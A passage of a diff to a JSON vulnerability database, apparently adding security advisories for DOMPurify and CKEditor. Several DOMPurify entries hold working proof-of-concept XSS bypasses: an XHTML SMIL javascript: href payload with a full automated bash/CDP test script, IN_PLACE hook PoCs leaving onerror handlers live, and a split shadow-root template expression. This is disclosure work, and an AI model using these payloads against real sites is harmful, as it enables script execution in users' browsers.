3.4.15. The 3.4.12 artifact predates that neutralization and behaves differently at the before/upon sites, so it is outside this specific incomplete-fix range. No release through 3.4.15 neutralizes detached subtrees at the afterSanitize sites, so no fixed version is established.\n\n## Suggested Fix\n\nEnforce the same `IN_PLACE` detach-neutralization invariant at every hook site that can detach a node, not only the before/upon sites. Concretely, apply a `_handleHookDetachedNode(currentNode, root)` re-check after `afterSanitizeElements` at both `src/purify.ts:2208` and `2249` (returning as removed when the node was detached), and add an equivalent `IN_PLACE` detach check plus `_neutralizeSubtree` after `afterSanitizeAttributes` at `2670`. As an interim mitigation without a code change, applications using `IN_PLACE` can avoid removing nodes inside `afterSanitizeElements`/`afterSanitizeAttributes` hooks and instead perform such removals in `beforeSanitizeElements`/`uponSanitizeElement`, or avoid `IN_PLACE` for attacker-influenced content.\n\nReported by zx (GitHub: @manus-pi).",
           "info": [
@@ -6268,6 +6388,73 @@
             "https://github.com/cure53/DOMPurify/pull/1636",
             "https://github.com/cure53/DOMPurify/commit/b9b9d80f7e401771c2ccaef5f45def7eec8f27d7",
             "https://github.com/cure53/DOMPurify/releases/tag/3.4.16"
+          ]
+        },
+        {
+          "atOrAbove": "0",
+          "below": "3.4.17",
+          "severity": "low",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "DOMPurify: SMIL attributeName=href guard is skipped when PARSER_MEDIA_TYPE is application/xhtml+xml",
+            "githubID": "GHSA-c6gr-qvv4-5v3f",
+            "CVE": [
+              "CVE-2026-116802"
+            ]
+          },
+          "details": "### Summary\n\nDOMPurify drops `attributeName` attributes whose value contains `href`, so an allowed `<animate>` or `<set>` can't rewrite a link's href after sanitizing. The check compares the attribute name after `transformCaseFunc`, and that function doesn't lowercase in XHTML mode. In XHTML the attribute is spelled `attributeName`, so the comparison with `\"attributename\"` never matches and the guard does nothing.\n\nAn app that uses `PARSER_MEDIA_TYPE: 'application/xhtml+xml'` and allows `animate` and `attributeName` will keep `<animate attributeName=\"href\" values=\"x;javascript:alert(1)\">`. Clicking the parent link then runs the script.\n\nThis needs a non-default config, so going by SECURITY.md, this is a hardening bug rather than a bypass of the default config.\n\n### Details\n\nIn `_sanitizeAttributes` (dist/purify.js line 2216 in 3.4.16):\n\n```js\nconst lcName = transformCaseFunc(name);\n...\nif (lcName === \"attributename\" && stringMatch(value, \"href\")) {\n  _removeAttribute(name, currentNode, attr);\n  continue;\n}\n```\n\n`transformCaseFunc` is `stringToLowerCase` for text/html but the identity function for application/xhtml+xml, because XML names are case-sensitive. The XML parser keeps SVG's real name `attributeName`, so in XHTML mode `lcName` is `attributeName` and the branch never runs.\n\nPeople using XHTML mode have to list SVG attributes in camelCase. The built-in attribute lists are lowercase and won't match, so `ALLOWED_ATTR`/`ADD_ATTR: ['attributeName', ...]` is the config you'd naturally write here.\n\nThe value also passes the URI check. `IS_ALLOWED_URI` only checks the start of the string, and `x;javascript:alert(1)` looks like a relative value. SMIL reads `values` as a `;` list and, with `fill=\"freeze\"`, the last entry ends up as the effective href of the parent `<a>`.\n\nIn text/html mode the same allowlist is handled correctly. The name is lowercased and `attributeName` is removed.\n\nThis is close to the XHTML case-sensitivity hardening in 3.4.14/3.4.15 (Attack Classes & Bypass History §22): a check written for lowercase names that a case-preserved name gets past.\n\n### Proof of concept\n\nTested with DOMPurify 3.4.16 in Chrome 153 (headless shell). Also reproduced on 3.3.3, 3.3.1 and 3.2.7. Not confirmed for 2.x.\n\nConfig:\n\n```js\nconst cfg = {\n  PARSER_MEDIA_TYPE: 'application/xhtml+xml',\n  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n};\n```\n\n`{ PARSER_MEDIA_TYPE: 'application/xhtml+xml', USE_PROFILES: { svg: true }, ADD_TAGS: ['animate'], ADD_ATTR: ['attributeName'] }` behaves the same.\n\nInput:\n\n```html\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\"><a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/><text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>\n```\n\nSteps:\n\n1. Save this as `poc.xhtml` next to `purify.js` (3.4.16) and open it in Chrome. The `.xhtml` extension makes Chrome load it as application/xhtml+xml, so nothing moves between HTML and XHTML.\n\n```html\n<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>poc</title>\n<script src=\"purify.js\"></script></head><body><div id=\"sink\"></div>\n<script>//<![CDATA[\nconst cfg = {\n  PARSER_MEDIA_TYPE: 'application/xhtml+xml',\n  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n};\nconst dirty = '<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\"><a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/><text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>';\nconst clean = DOMPurify.sanitize(dirty, cfg);\nconsole.log(clean);\ndocument.getElementById('sink').innerHTML = clean;\n//]]></script></body></html>\n```\n\n2. The logged output still contains `attributeName=\"href\"` and `values=\"x;javascript:alert(1)\"`.\n3. `document.getElementById('q').href.animVal` returns `\"javascript:alert(1)\"`.\n4. Click \"click\" and `alert(1)` runs.\n\nAs a control, remove `PARSER_MEDIA_TYPE` and change the allowlist entry to `attributename`. The output then loses `attributeName`, `href.animVal` is `\"\"`, and clicking does nothing. The same XHTML-mode output also runs when inserted into a normal text/html page.\n\nAn automated version (fetches a given version from npm, clicks via CDP, checks for the dialog, runs the control) is below.\n\n<details>\n<summary>poc.sh</summary>\n\n```bash\n#!/usr/bin/env bash\n# PoC: DOMPurify SMIL attributeName=href guard bypass in XHTML parser mode.\n#\n# Sanitizes an SVG payload with a PARSER_MEDIA_TYPE:\"application/xhtml+xml\"\n# config that allow-lists <animate> + attributeName, renders the output into\n# div.innerHTML in headless Chromium, clicks the link with a trusted (CDP) mouse\n# event and reports whether alert() fired. Also runs the same allowlist in\n# text/html mode as a control (DOMPurify strips attributeName there).\n#\n# usage:  ./poc.sh [dompurify-version]          (default 3.4.16, fetched via `npm pack`)\n#         DOMPURIFY_JS=/path/to/purify.js ./poc.sh\n#         CHROME=/path/to/chrome ./poc.sh\n# needs:  node >= 18, npm (unless DOMPURIFY_JS is set), a Chromium/Chrome binary.\n# exit:   0 = vulnerable (alert fired in xhtml mode), 1 = not vulnerable, 2 = setup error\nset -euo pipefail\nVER=\"${1:-3.4.16}\"\nWORK=\"$(mktemp -d)\"\ntrap 'rm -rf \"$WORK\"' EXIT\n\nif [ -z \"${DOMPURIFY_JS:-}\" ]; then\n  (cd \"$WORK\" && npm pack \"dompurify@$VER\" --silent >/dev/null 2>&1 && tar xzf dompurify-*.tgz) || { echo \"npm pack dompurify@$VER failed\" >&2; exit 2; }\n  DOMPURIFY_JS=\"$WORK/package/dist/purify.js\"\nfi\nif [ -z \"${CHROME:-}\" ]; then\n  for c in \"$HOME\"/.cache/ms-playwright/chromium_headless_shell-*/chrome-headless-shell-linux64/chrome-headless-shell \\\n           \"$HOME\"/.cache/ms-playwright/chromium-*/chrome-linux/chrome \\\n           \"$(command -v google-chrome || true)\" \"$(command -v chromium || true)\" \"$(command -v chromium-browser || true)\"; do\n    [ -n \"$c\" ] && [ -x \"$c\" ] && CHROME=\"$c\" && break\n  done\nfi\n[ -n \"${CHROME:-}\" ] || { echo \"no Chrome/Chromium found; set CHROME=\" >&2; exit 2; }\n\ncat > \"$WORK/poc.html\" <<'EOF'\n<!doctype html><meta charset=\"utf-8\"><title>poc</title>\n<script src=\"purify.js\"></script>\n<div id=\"sink\"></div>\n<script>//<![CDATA[\nconst payload = '<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\">' +\n  '<a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/>' +\n  '<text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>';\nfunction run(mode) {\n  const cfg = {\n    ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n    ALLOWED_ATTR: [mode === 'xhtml' ? 'attributeName' : 'attributename', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n  };\n  if (mode === 'xhtml') cfg.PARSER_MEDIA_TYPE = 'application/xhtml+xml';\n  const clean = DOMPurify.sanitize(payload, cfg);\n  document.getElementById('sink').innerHTML = clean;\n  return clean;\n}\n//]]></script>\nEOF\ncp \"$DOMPURIFY_JS\" \"$WORK/purify.js\"\n# Same test inside a real XHTML document (no HTML<->XHTML context flip):\n# the page is parsed as application/xhtml+xml and the sink's innerHTML uses the XML fragment parser.\nsed -e 's#<!doctype html><meta charset=\"utf-8\"><title>poc</title>#<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>poc</title>#' \\\n    -e 's#<script src=\"purify.js\"></script>#<script src=\"purify.js\"></script></head><body>#' \\\n    -e 's#^</script>$#</script></body></html>#' \"$WORK/poc.html\" > \"$WORK/poc.xhtml\"\n\ncat > \"$WORK/drive.js\" <<'EOF'\n// zero-dependency CDP driver over --remote-debugging-pipe\nconst { spawn } = require('child_process');\nconst [chrome, url, dir] = process.argv.slice(2);\nconst xurl = url.replace(/\\.html$/, '.xhtml');\nconst p = spawn(chrome, ['--headless', '--no-sandbox', '--remote-debugging-pipe', '--disable-gpu', '--no-first-run',\n  `--user-data-dir=${dir}/profile`, 'about:blank'], { stdio: ['ignore', 'ignore', 'ignore', 'pipe', 'pipe'] });\nlet id = 0, buf = ''; const pend = new Map(), dialogs = [];\np.stdio[4].on('data', (d) => {\n  buf += d; let i;\n  while ((i = buf.indexOf('\\0')) >= 0) {\n    const m = JSON.parse(buf.slice(0, i)); buf = buf.slice(i + 1);\n    if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); }\n    else if (m.method === 'Page.javascriptDialogOpening') {\n      dialogs.push(m.params.message);\n      send('Page.handleJavaScriptDialog', { accept: true }, m.sessionId);\n    }\n  }\n});\nfunction send(method, params = {}, sessionId) {\n  return new Promise((r) => { const n = ++id; pend.set(n, r); p.stdio[3].write(JSON.stringify({ id: n, method, params, sessionId }) + '\\0'); });\n}\nconst sleep = (ms) => new Promise((r) => setTimeout(r, ms));\n(async () => {\n  const { result: { targetId } } = await send('Target.createTarget', { url: 'about:blank' });\n  const { result: { sessionId: s } } = await send('Target.attachToTarget', { targetId, flatten: true });\n  await send('Page.enable', {}, s); await send('Runtime.enable', {}, s);\n  const ev = async (e) => (await send('Runtime.evaluate', { expression: e, returnByValue: true, awaitPromise: true }, s)).result.result.value;\n  let vulnerable = false, xhtmlDoc = false;\n  const ver = async () => ev('DOMPurify.version');\n  for (const [mode, page] of [['html', url], ['xhtml', url], ['xhtml', xurl]]) {\n    await send('Page.navigate', { url: page }, s); await sleep(500);\n    const docType = await ev('document.contentType');\n    if (mode === 'html') console.log('DOMPurify', await ver(), '/', await ev('navigator.userAgent.match(/Chrome\\\\/[\\\\d.]+/)[0]'));\n    dialogs.length = 0;\n    const clean = await ev(`run(${JSON.stringify(mode)})`);\n    await sleep(400); // let the 0.01s animation apply (fill=freeze)\n    const href = await ev(`(()=>{const a=document.getElementById('q');return a?a.href.animVal:null})()`);\n    const box = await ev(`(()=>{const t=document.querySelector('#sink text');if(!t)return null;const r=t.getBoundingClientRect();return [r.x+r.width/2,r.y+r.height/2]})()`);\n    if (box) for (const type of ['mouseMoved', 'mousePressed', 'mouseReleased'])\n      await send('Input.dispatchMouseEvent', { type, x: box[0], y: box[1], button: 'left', clickCount: 1 }, s);\n    await sleep(800);\n    console.log(`\\n[${mode} mode, sink document ${docType}] sanitized output:\\n  ${clean}`);\n    console.log(`  animated <a> href (animVal): ${JSON.stringify(href)}`);\n    console.log(`  alert() fired on click: ${dialogs.length ? 'YES ' + JSON.stringify(dialogs) : 'no'}`);\n    if (mode === 'xhtml' && dialogs.length) vulnerable = true;\n    if (mode === 'xhtml' && docType === 'application/xhtml+xml') xhtmlDoc = dialogs.length > 0;\n  }\n  console.log(vulnerable ? `\\nRESULT: VULNERABLE (javascript: executed in XHTML mode; pure-XHTML document sink: ${xhtmlDoc ? 'also executes' : 'no'})` : '\\nRESULT: not vulnerable');\n  p.kill('SIGKILL'); process.exit(vulnerable ? 0 : 1);\n})().catch((e) => { console.error(e); p.kill('SIGKILL'); process.exit(2); });\nEOF\nnode \"$WORK/drive.js\" \"$CHROME\" \"file://$WORK/poc.html\" \"$WORK\"\n```\n\n</details>\n\n### Impact\n\nStored or reflected XSS on a click. It affects apps that sanitize SVG in XHTML mode and allow `animate` (or `set`) with `attributeName`, for example to keep simple SVG animations. Script runs in the app's origin when a user clicks the sanitized link. Default configs and text/html mode aren't affected.",
+          "info": [
+            "https://github.com/cure53/DOMPurify/security/advisories/GHSA-c6gr-qvv4-5v3f",
+            "https://github.com/cure53/DOMPurify/pull/1672",
+            "https://github.com/cure53/DOMPurify/commit/a77a3e78b59f72fa4d1c83f22e121ad9cc7d3575",
+            "https://github.com/cure53/DOMPurify/releases/tag/3.4.17"
+          ]
+        },
+        {
+          "atOrAbove": "0",
+          "below": "3.4.17",
+          "severity": "high",
+          "cwe": [
+            "CWE-693",
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "DOMPurify IN_PLACE: hook that removes a parent or sibling leaves the detached subtree's event handlers armed (incomplete fix for GHSA-p98j-92pf-mc4p)",
+            "githubID": "GHSA-mrv2-3pqr-j5jr",
+            "CVE": [
+              "CVE-2026-116803"
+            ]
+          },
+          "details": "### Summary\n\nThe 3.4.16 fix for GHSA-p98j-92pf-mc4p only covers a hook that removes the node it was called for. If an `IN_PLACE` hook removes a different node, like the current node's parent or a sibling that has not been visited yet, that subtree is never walked or neutralized. Event handlers in it stay on the elements, and an `<img onerror>` that was already loading fires after `sanitize()` returns.\n\nThe README says: \"Nodes that a hook detaches from the tree ... are treated as removed. In IN_PLACE mode their subtree is neutralized inline, so an `<img onload>` that was already loading when you built the live tree cannot fire after `sanitize()` returns.\" That does not hold when the detached node is not the hook's own node.\n\n### Tested versions\n\n- 3.4.16 (latest) and main at 18f8f0e\n- also 3.4.15, 3.4.12 and 2.5.8\n\njsdom for the matrix below, and Chromium (Playwright) for the event actually firing.\n\n### Details\n\n`src/purify.ts` line 2134 (`dist/purify.cjs.js` line 2009 in 3.4.16), `_handleHookDetachedNode()`:\n\n```js\nif (currentNode === root || getParentNode(currentNode) !== null) {\n  return false;\n}\nif (IN_PLACE) {\n  _neutralizeSubtree(currentNode);\n}\n```\n\nIt only checks whether `currentNode` lost its parent. When a hook removes `currentNode.parentNode` (or any ancestor), `currentNode` still has a parent, so nothing happens. The rest of the removed subtree is no longer reachable by the walker, and it is not in `DOMPurify.removed`, so the post walk pass does not see it either. The same happens when a hook removes a later sibling. This applies to all five element and attribute hooks.\n\n### PoC (jsdom)\n\n```js\nconst { JSDOM } = require('jsdom')\nconst createDOMPurify = require('dompurify')\nconst win = new JSDOM('<!doctype html><body></body>').window\nconst doc = win.document\n\nfor (const mode of ['self', 'parent', 'nextSibling']) {\n  const DOMPurify = createDOMPurify(win)\n  doc.body.innerHTML = '<div id=root><figure><img class=bad src=a.png>' +\n    '<img id=evil src=x onerror=alert(1)></figure><p>ok</p></div>'\n  const root = doc.getElementById('root')\n  const evil = doc.getElementById('evil')\n\n  // app hook: drop a bad image (self), its wrapper (parent), or the next element (nextSibling)\n  DOMPurify.addHook('afterSanitizeAttributes', (node) => {\n    if (node.getAttribute && node.getAttribute('class') === 'bad') {\n      if (mode === 'self') node.remove()\n      if (mode === 'parent') node.parentNode.remove()\n      if (mode === 'nextSibling') node.nextElementSibling.remove()\n    }\n  })\n\n  DOMPurify.sanitize(root, { IN_PLACE: true })\n  console.log(DOMPurify.version, mode.padEnd(11), 'onerror =', JSON.stringify(evil.getAttribute('onerror')))\n}\n```\n\nOutput on 3.4.16:\n\n```\n3.4.16 self        onerror = null\n3.4.16 parent      onerror = \"alert(1)\"\n3.4.16 nextSibling onerror = \"alert(1)\"\n```\n\nIn `self` mode the walker still reaches the second image and strips `onerror`. In the other two modes the second image is detached with its handler still set. The same result is achieved with each of `beforeSanitizeElements`, `uponSanitizeElement`, `afterSanitizeElements`, `beforeSanitizeAttributes` and `afterSanitizeAttributes`.\n\n### PoC (browser)\n\nThe same thing in a real page, served from 127.0.0.1 and opened in Chromium:\n\n```html\n<!doctype html><meta charset=utf-8>\n<script src=\"purify.min.js\"></script>\n<body><pre id=log></pre>\n<script>\nwindow.fired = [];\nfunction run(mode) {\n  const D = DOMPurify(window);\n  D.addHook('afterSanitizeAttributes', n => {\n    if (n.getAttribute && n.getAttribute('class') === 'bad') {\n      if (mode === 'parent') n.parentNode.remove();\n      if (mode === 'self') n.remove();\n    }\n  });\n  const root = document.createElement('div');\n  document.body.appendChild(root);\n  root.innerHTML = '<figure><img class=bad src=data:,><img src=x onerror=\"fired.push(\\'' + mode + '\\')\"></figure><p>ok</p>';\n  D.sanitize(root, { IN_PLACE: true });\n  return root.outerHTML;\n}\nconst a = run('self'), b = run('parent');\nsetTimeout(() => {\n  document.getElementById('log').textContent =\n    'version=' + DOMPurify.version + '\\nself out=' + a + '\\nparent out=' + b + '\\nfired=' + JSON.stringify(fired);\n}, 1500);\n</script>\n```\n\nResult on 3.4.16:\n\n```\nversion=3.4.16\nself out=<div><figure><img src=\"x\"></figure><p>ok</p></div>\nparent out=<div><p>ok</p></div>\nfired=[\"parent\"]\n```\n\nThe returned tree is clean in both cases, but the handler on the detached image runs in the page for `parent`.\n\n### Impact\n\nAn app that uses `IN_PLACE` with a hook that removes a wrapper or a nearby element (for example \"drop the whole `<figure>` if its image is not allowed\") gets DOM XSS from attacker markup after `sanitize()` returns. It needs that kind of hook, so it falls under \"input plus an application choice\" in SECURITY.md, but it breaks the guarantee the README gives for hook detached nodes and is the same pattern as GHSA-55q2-fjhq-7xh7 and GHSA-p98j-92pf-mc4p.\n\n### Suggested fix\n\nInstead of only checking `currentNode`, check after each hook call whether anything outside the current node was detached. Two simple options:\n\n- before calling a hook in `IN_PLACE` mode, remember the next node the walker will visit and the current node's ancestors; after the hook, neutralize any of them that are no longer attached under `root`\n- or, after the walk, neutralize every element that was in the original tree but is no longer connected to `root` (for example by collecting the elements before the walk)",
+          "info": [
+            "https://github.com/cure53/DOMPurify/security/advisories/GHSA-mrv2-3pqr-j5jr",
+            "https://github.com/cure53/DOMPurify/pull/1672",
+            "https://github.com/cure53/DOMPurify/commit/a77a3e78b59f72fa4d1c83f22e121ad9cc7d3575",
+            "https://github.com/cure53/DOMPurify/releases/tag/3.4.17"
+          ]
+        },
+        {
+          "atOrAbove": "3.4.4",
+          "below": "3.4.17",
+          "severity": "critical",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "DOMPurify SAFE_FOR_TEMPLATES bypass: split template expressions survive in attached shadow root content on DOM output modes",
+            "githubID": "GHSA-cg2g-xh64-v4q7",
+            "CVE": [
+              "CVE-2026-116804"
+            ]
+          },
+          "details": "## Summary\n\nWhen DOMPurify is configured with `SAFE_FOR_TEMPLATES: true` together with a DOM-returning mode (`RETURN_DOM: true`, `RETURN_DOM_FRAGMENT: true`, or `IN_PLACE: true`), template expressions such as `{{...}}`, `${...}`, and `<%...%>` survive sanitization inside the text content of an attached shadow root. The post-walk safety net `_scrubTemplateExpressions` (`src/purify.ts:1717`) was extended to recurse into `<template>.content`, but it never recurses into attached shadow roots. An attacker who can supply a DOM node carrying a shadow root (the `IN_PLACE` and shadow-aware `RETURN_DOM` surfaces) can split an expression across text nodes separated by disallowed elements; after those elements are removed the fragments become adjacent and serialize into a complete expression that a downstream template engine will evaluate.\n\n## Root Cause\n\n`SAFE_FOR_TEMPLATES` neutralizes template expressions through two mechanisms: a per-text-node strip during the main walk (`_stripTemplateExpressions`, applied in `_sanitizeElements` at `src/purify.ts:2246`), and a final post-walk pass (`_scrubTemplateExpressions`, `src/purify.ts:1717`) that normalizes adjacent text nodes and re-strips expressions that only form after merging. The per-node strip cannot catch an expression that is split into individual fragments, because each fragment fails the delimiter regexes. The post-walk pass is the only mechanism that would catch the merged form, but it is structurally unable to reach shadow root content.\n\n```text\n_scrubTemplateExpressions (src/purify.ts:1717-1751):\n  - node.normalize() at line 1718 does not merge text nodes inside shadow roots (DOM spec).\n  - NodeIterator at lines 1723-1731 does not descend into shadow trees (DOM spec).\n  - Explicit recursion at lines 1743-1750 enters <template>.content only, via\n    querySelectorAll('template'); there is no equivalent recursion into attached\n    shadow roots.\nShadow roots are sanitized earlier by _sanitizeShadowDOM (src/purify.ts:2710), which\napplies the per-node strip but never performs the post-walk normalize-and-rescrub.\n```\n\nShadow root text nodes are therefore sanitized only per-node and never re-examined as a merged unit.\n\n## Impact\n\nAn attacker who controls DOM-node input containing an attached shadow root can inject template expressions that survive sanitization and are later evaluated by the application's template engine. In client-side contexts this yields cross-site scripting; in a server-side template context it can escalate to template injection. Exploitation requires non-default application configuration: the application must enable `SAFE_FOR_TEMPLATES` and a DOM-returning mode, pass a DOM node that already has an attached shadow root, and feed the sanitized shadow root content into a template evaluator. The shadow root does not have to be built programmatically with `attachShadow`: in engines that support declarative shadow DOM, attacker-supplied markup containing `<template shadowrootmode=\"open\">` parsed through `setHTMLUnsafe` or `Document.parseHTMLUnsafe` produces the same attached shadow root, so a plain HTML string reaches the gap once the application is configured this way. Demonstrated capability is injection of a complete, attacker-chosen expression into post-sanitization shadow root content; the resulting script execution and any confidentiality or integrity consequence depend on the downstream engine's evaluation context.\n\n## Proof of Concept\n\n```text\nPreconditions:\n  - DOMPurify built from the affected source (dist/purify.js or an ESM/CJS bundle).\n  - A browser (or DOM implementation) with shadow DOM support.\n  - Application constructs a DOM node with an attached shadow root before sanitizing,\n    and later evaluates the shadow root's text content as a template.\n```\n\nBuild a host element whose shadow root holds a template expression split across text nodes separated by disallowed elements, then sanitize in place with `SAFE_FOR_TEMPLATES`:\n\n```javascript\nconst host = document.createElement('div');\nconst root = host.attachShadow({ mode: 'open' });\n\n// Split \"${alert(document.domain)}\" so no single fragment matches a regex.\n// <object> is not in the default ALLOWED_TAGS and is removed during sanitization,\n// leaving the surrounding text-node siblings adjacent.\nroot.appendChild(document.createTextNode('$'));\nroot.appendChild(document.createElement('object'));\nroot.appendChild(document.createTextNode('{alert(document.domain)}'));\n\nDOMPurify.sanitize(host, { IN_PLACE: true, SAFE_FOR_TEMPLATES: true });\n\n// After the disallowed element is removed, the fragments are adjacent and survive.\nhost.shadowRoot.normalize();\nconsole.log(host.shadowRoot.textContent);\n```\n\n```text\n${alert(document.domain)}\n```\n\nA downstream template evaluator reading `shadowRoot.textContent` (for example `new Function('return `' + content + '`')()` or any `${...}`/`{{...}}` engine) then evaluates the fully formed expression.\n\n## Attack Chain\n\n1. **Exposure:** The application calls `DOMPurify.sanitize(node, cfg)` (`src/purify.ts:2854`) with `SAFE_FOR_TEMPLATES: true` and `IN_PLACE: true` (or a shadow-aware `RETURN_DOM`), passing a DOM node that already carries an attached shadow root.\n2. **Control:** The attacker controls the shadow root's text nodes and the disallowed separator elements between them; each fragment (`$`, `{alert(document.domain)}`) is a valid, individually benign text node.\n3. **Path:** `_sanitizeAttachedShadowRoots` (`src/purify.ts:2977`) feeds the shadow root into `_sanitizeShadowDOM` (`src/purify.ts:2710`), which strips expressions per text node (`src/purify.ts:2246`) and removes the disallowed separator elements, leaving the fragments adjacent.\n4. **Guard:** The post-walk safety net `_scrubTemplateExpressions` (`src/purify.ts:3131-3132`) is the only pass that would catch the merged expression, but it never recurses into shadow roots (`src/purify.ts:1717-1751` recurses into `<template>.content` only).\n5. **Primitive:** The adjacent fragments serialize as a single concatenated string on `shadowRoot.textContent` / `shadowRoot.innerHTML`, reconstituting the complete expression.\n6. **Result:** A downstream template engine evaluates the attacker-chosen expression, achieving script execution (or template injection) in the engine's context.\n\n## Bypass Evidence\n\nThe relevant protection is `SAFE_FOR_TEMPLATES`, specifically the post-walk pass that defends against expressions that only form after adjacent text nodes merge. That defense was previously extended to `<template>.content` under CVE-2026-65900 (GHSA-gvmj-g25r-r7wr) by adding `querySelectorAll('template')` recursion at `src/purify.ts:1743-1750`. The strongest challenge is whether any code path performs the equivalent merge-and-rescrub inside shadow roots. Enumerating every call site of `_scrubTemplateExpressions` (`src/purify.ts:1717`, `1747`, `3132`, `3141`) shows none receive a shadow root, and `_sanitizeShadowDOM` (`src/purify.ts:2710`) never calls `_scrubTemplateExpressions` or `normalize()`. The per-node strip cannot compensate: `MUSTACHE_EXPR` (`src/regexp.ts:3`) requires `{{` or `}}`, `TMPLIT_EXPR` (`src/regexp.ts:5`) requires `${`, and `ERB_EXPR` (`src/regexp.ts:4`) requires `<%` or `%>`, none of which appear in a single-character fragment. The CVE-2026-65900 regression tests exercise `<template>.content` only; no test covers shadow root content under `SAFE_FOR_TEMPLATES`. The gap is therefore an unfixed case on a distinct remediation boundary (shadow roots) rather than a bypass of the delivered template-content fix.\n\n## Affected Versions\n\n- **Ecosystem:** `npm`\n- **Package:** `dompurify`\n- **Confirmed affected range:** `>= 3.4.4, <= 3.4.16`\n- **Latest release checked:** `3.4.16` ([npm registry](https://www.npmjs.com/package/dompurify/v/3.4.16))\n- **Fix status:** not fixed\n\nThe lower bound 3.4.4 is the release that introduced both the attached-shadow-root sanitization pass and the `_scrubTemplateExpressions` safety net; releases 3.4.4 through 3.4.7 carry the safety net with no content-container recursion, and 3.4.8 onward add `<template>.content` recursion but still omit shadow root recursion. No published release and no current development revision contains a shadow-root fix.\n\n## Suggested Fix\n\nEnforce the same post-walk normalize-and-rescrub invariant on attached shadow roots that already applies to `<template>.content`. After `_sanitizeShadowDOM` finishes walking a shadow root, run `_scrubTemplateExpressions` over that shadow root so adjacent text nodes created by element removal are merged and re-stripped; alternatively, have `_scrubTemplateExpressions` discover and recurse into attached shadow roots as it does for template content. The fix must cover nested shadow roots and shadow roots inside `<template>.content`, and it must handle all three expression dialects, since any disallowed element can serve as the separator that produces adjacent fragments.\n\n---\n\nReported by zx (GitHub: @manus-pi).",
+          "info": [
+            "https://github.com/cure53/DOMPurify/security/advisories/GHSA-cg2g-xh64-v4q7",
+            "https://github.com/cure53/DOMPurify/pull/1672",
+            "https://github.com/cure53/DOMPurify/commit/a77a3e78b59f72fa4d1c83f22e121ad9cc7d3575",
+            "https://github.com/cure53/DOMPurify/releases/tag/3.4.17"
           ]
         }
       ],
@@ -7667,6 +7854,98 @@
           "info": [
             "https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-x9gp-vjh6-3wv6",
             "https://github.com/ckeditor/ckeditor5/commit/b210e90c6cf84e662ef6c7daf93a92355a961bf2"
+          ]
+        },
+        {
+          "atOrAbove": "29.0.0",
+          "below": "47.7.4",
+          "severity": "low",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "CKEditor: Cross-site scripting (XSS) in the engine package",
+            "githubID": "GHSA-v6mg-96c6-gmpq",
+            "CVE": [
+              "CVE-2026-116687"
+            ]
+          },
+          "details": "### Impact\nA Cross-Site Scripting (XSS) vulnerability has been discovered in the CKEditor 5 engine. This vulnerability could be triggered by inserting specially crafted markup under a specific General HTML Support configuration that allows inserting objects, leading to unauthorized JavaScript code execution in a browser context isolated from the origin of the application embedding the editor.\n\nThis vulnerability affects only installations where General HTML Support is enabled and configured to allow the affected HTML content.\n\n### Patches\nThe problem has been recognized and patched. The fix will be available in version `48.5.1` (and above) and `47.7.4` (LTS).\n\n### For more information\nEmail us at [security@cksource.com](mailto:security@cksource.com) if you have any questions or comments about this advisory.",
+          "info": [
+            "https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-v6mg-96c6-gmpq",
+            "https://github.com/ckeditor/ckeditor5/commit/4d9c5bb34f63cd956d15ccafbe584e14280c86a0",
+            "https://github.com/ckeditor/ckeditor5/commit/a750e38635db6a18c5b11599c09f4fd702850423",
+            "https://github.com/ckeditor/ckeditor5/releases/tag/v47.7.4",
+            "https://github.com/ckeditor/ckeditor5/releases/tag/v48.5.1"
+          ]
+        },
+        {
+          "atOrAbove": "45.0.0",
+          "below": "47.7.4",
+          "severity": "high",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "CKEditor: Cross-site scripting (XSS) in the engine package",
+            "githubID": "GHSA-rh54-vffm-5fvp",
+            "CVE": [
+              "CVE-2026-116688"
+            ]
+          },
+          "details": "### Impact\nA Cross-Site Scripting (XSS) vulnerability has been discovered in the CKEditor 5 engine. This vulnerability is caused by a prototype pollution issue in the `es-toolkit` library used in the CKEditor 5 codebase. This vulnerability could lead to unauthorized JavaScript code execution when the editor processes incoming `style` attribute values.\n\nThe underlying issue has been patched by the library maintainers, and the fix has been incorporated into CKEditor 5.\n\n### Patches\nThe problem has been recognized and patched. The fix will be available in version `48.5.1` (and above) and `47.7.4` (LTS).\n\n### For more information\nEmail us at [security@cksource.com](mailto:security@cksource.com) if you have any questions or comments about this advisory.",
+          "info": [
+            "https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-rh54-vffm-5fvp",
+            "https://github.com/ckeditor/ckeditor5/commit/4d9c5bb34f63cd956d15ccafbe584e14280c86a0",
+            "https://github.com/ckeditor/ckeditor5/commit/a750e38635db6a18c5b11599c09f4fd702850423",
+            "https://github.com/ckeditor/ckeditor5/releases/tag/v47.7.4",
